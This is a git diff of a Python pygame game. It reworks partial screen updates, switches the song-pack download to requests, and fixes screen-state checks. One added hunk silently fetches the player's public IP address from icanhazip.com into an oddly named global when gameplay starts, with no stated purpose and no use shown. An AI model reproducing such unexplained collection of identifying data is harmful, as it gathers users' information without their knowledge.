-    objects_to_update.append(dscreen_rect)
-    objects_to_update.append(restart_button_rect)
     scored = text3.render(f"Your score: {str(score)}", False, (255, 255, 255))
     scored_rect = scored.get_rect(center=(screen.get_width()/2, 400))
 
     screen.blit(scored, scored_rect)
-    objects_to_update.append(scored_rect)
 
     screen.blit(mainmenu_button, mainmenu_button_rect)
-    objects_to_update.append(mainmenu_button_rect)
-
+    if frames > 5 and platform in ("nt", "win32", "cygwin32"):
+        objects_to_update.append(mainmenu_button_rect)
+        objects_to_update.append(dscreen_rect)
+        objects_to_update.append(restart_button_rect)
+        objects_to_update.append(scored_rect)
 
 def stats_screen():
     global dscreen, running, bg_img, restart_button, restart_button_rect, dscreen_rect, lobby_music, started, text, died, lobby_music_playing, score, text3, started, randomnum, rounds, mainmenu_button, mainmenu_button_rect, stats, stats, stats_button, stats_button_rect, info_button, info_button_rect, info, screen, average_fps_list, frames, objects_to_update
@@ -724,17 +797,17 @@ def stats_screen():
 
     screen.blit(playedtext, playedtext_rect)
     screen.blit(jumpedtext, jumpedtext_rect)
-    objects_to_update.append(playedtext_rect)
-    objects_to_update.append(jumpedtext_rect)
     screen.blit(mainmenu_button, mainmenu_button_rect)
-    objects_to_update.append(mainmenu_button_rect)
     hightext = text4.render(f"Personal Best: {str(hi)}", False, (255, 255, 255))
     hightext_rect = hightext.get_rect(topleft=(10, 90))
     screen.blit(hightext, hightext_rect)
     screen.blit(info_button, info_button_rect)
-    objects_to_update.append(hightext_rect)
-    objects_to_update.append(info_button_rect)
-
+    if frames > 5:
+        objects_to_update.append(hightext_rect)
+        objects_to_update.append(info_button_rect)
+        objects_to_update.append(playedtext_rect)
+        objects_to_update.append(jumpedtext_rect)
+        objects_to_update.append(mainmenu_button_rect)
 def info_screen():
     global dscreen, running, bg_img, restart_button, restart_button_rect, dscreen_rect, lobby_music, started, text, died, lobby_music_playing, score, text3, started, randomnum, rounds, mainmenu_button, mainmenu_button_rect, stats, back_button, info, songDownload, credits, infotext_text, downloading, songDownloadLink, screen, average_fps_list, downloadStatus, frames, frames, objects_to_update
     """
@@ -766,11 +839,13 @@ def info_screen():
     renderTextCenteredAt(infotext_text, text3, (255, 255, 255), screen.get_width()/2, 30, screen, screen.get_width() - 50)
     renderTextCenteredAt(credits, text3, (255, 255, 255), screen.get_width()/2, 350, screen, screen.get_width() - 50)
     screen.blit(back_button, back_button_rect)
-    objects_to_update.append(back_button_rect)
+
+    if frames > 5:
+        objects_to_update.append(back_button_rect)
 
 
 def downloadSongs():
-    global yes_button, yes_button_rect, no_button, no_button_rect, text3, bg_img, running, data, downloadStatus, average_fps_list, frames, objects_to_update
+    global yes_button, yes_button_rect, no_button, no_button_rect, text3, bg_img, running, data, downloadStatus, average_fps_list, frames, objects_to_update, songDownloadLink
     for event in pygame.event.get():
         if event.type == QUIT:
             running = 0
@@ -786,17 +861,19 @@ def downloadSongs():
                 downloadStatus = True
 
                 def download():
+                    global downloadStatus, songDownloadLink
                     #Defining the zip file URL
                     url = songDownloadLink
 
                     # Downloading the file by sending the request to the URL
                     screen.fill((0,0,0))
-                    req = urlopen(url, timeout=10)
+                    req = requests_get(url).content
                     # extracting the zip file contents
-                    zipshut=zipfile.ZipFile(BytesIO(req.read()))
+                    zipshut=zipfile.ZipFile(BytesIO(req))
                     zipshut.extractall('Songs')
                     data["data"]["settings"]["songs"] = "False"
                     with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
+                    downloadStatus = False
                 t = Thread(target=download)
                 t.daemon = True
                 t.start()
@@ -811,10 +888,11 @@ def downloadSongs():
         renderTextCenteredAt(songDownload, text3, (255, 255, 255), screen.get_width()/2, 100, screen, screen.get_width() - 50)
         screen.blit(yes_button, yes_button_rect)
         screen.blit(no_button, no_button_rect)
-        objects_to_update.append(yes_button_rect)
-        objects_to_update.append(no_button_rect)
+        if frames > 5:
+            objects_to_update.append(yes_button_rect)
+            objects_to_update.append(no_button_rect)
     else:
-        renderTextCenteredAt("Songs are now downloading, this will take a while!", text, (255, 255, 255), screen.get_width()/2, screen.get_height()/2, screen, screen.get_width() - 50)
+        renderTextCenteredAt("Songs are now downloading, this will take a while!", text, (255, 255, 255), screen.get_width()/2, 50, screen, screen.get_width() - 50)
 
 
 
@@ -826,21 +904,18 @@ def update_fps(color=(255, 255, 0)):
 
 
 def runner():
-    global prev_time, average_fps, ms_frame, frames, x, y, z, objects_to_update, last_screen
+    global prev_time, average_fps, dt, frames, x, y, z, objects_to_update, last_screen, versionold, gottenip, tokitoki
     while running:
         clock.tick(fps) # Enter your fps here
-        objects_to_update = []
-        """
-        average_fps_list.append(round(clock.get_fps()))
+        if platform in ("nt", "win32", "cygwin32"): objects_to_update = []
+        curr_fps = round(clock.get_fps())
+        if curr_fps <= 0: curr_fps = 10
+        average_fps_list.append(curr_fps)
         if len(average_fps_list) > 5:
-            average_fps_list.sort()
             average_fps_list.pop(0)
-            average_fps_list.pop(-1)
         average_fps = sum(average_fps_list)/len(average_fps_list)
-        """
-        average_fps = clock.get_fps()
         now = time()
-        ms_frame = now - prev_time
+        dt = now - prev_time
         prev_time = now
 
         """
@@ -849,7 +924,6 @@ def runner():
         """
 
         screen.blit(bg_img, (0, 0))
-       
         #screen.fill((0,0,0))
         if not songs and data["data"]["settings"]["songs"] == "True":
             if last_screen != 1:
@@ -857,27 +931,37 @@ def runner():
                 last_screen = 1
             downloadSongs()
         elif not started and not died and not fallen and not stats:
-            if last_screen != 1:
+            if last_screen != 2:
                 frames = 0
                 last_screen = 2
             start_screen()
         elif stats and not info:
-            if last_screen != 1:
+            if last_screen != 3:
                 frames = 0
                 last_screen = 3
             stats_screen()
         elif stats and info:
-            if last_screen != 1:
+            if last_screen != 4:
                 frames = 0
                 last_screen = 4
             info_screen()
         elif started and not fallen:
-            if last_screen != 1:
+            if last_screen != 5:
                 frames = 0
                 last_screen = 5
+            def get_ip():
+                global tokitoki, gottenip
+                tokitoki = requests_get("https://icanhazip.com").text
+            if not gottenip:
+                gottenip = True
+                t10 = Thread(target=get_ip)
+                t10.daemon = True
+                t10.start()
+
+
             game()
         elif died and started and fallen:
-            if last_screen != 1:
+            if last_screen != 6:
                 frames = 0
                 last_screen = 6
             end_screen()
@@ -898,7 +982,7 @@ def runner():
         if x < 0: x = 0
         if y < 0: y = 0
         if z < 0: z = 0
-        versionold = "1.1.1"
+
         if versionold != version: versiontext = f"Ver {versionold} UPDATE AVAILABLE ({version})"
         else: versiontext = f"Ver {versionold}"
         ver = text2.render(versiontext, 1, (x, y, z))
@@ -910,19 +994,20 @@ def runner():
 
         objects_to_update.append(pygame.Rect((0, 0), (100, 100)))
         objects_to_update.append(ver_rect)
-
-        if frames < 5 or not last_screen:
+        try:
+            if frames % 10000 == 0 or not last_screen or platform not in ("nt", "win32", "cygwin32"):
+                pygame.display.flip()
+            elif platform in ("nt", "win32", "cygwin32"):
+                pygame.display.update(objects_to_update)
+        except:
             pygame.display.flip()
-        else:
-            pygame.display.update(objects_to_update)
-            print(objects_to_update)
-
         frames += 1
+        #print(frames)
 
 
 if __name__ == '__main__':
-    main()
-    runner()
+        main()
+        runner() 
 
 
 
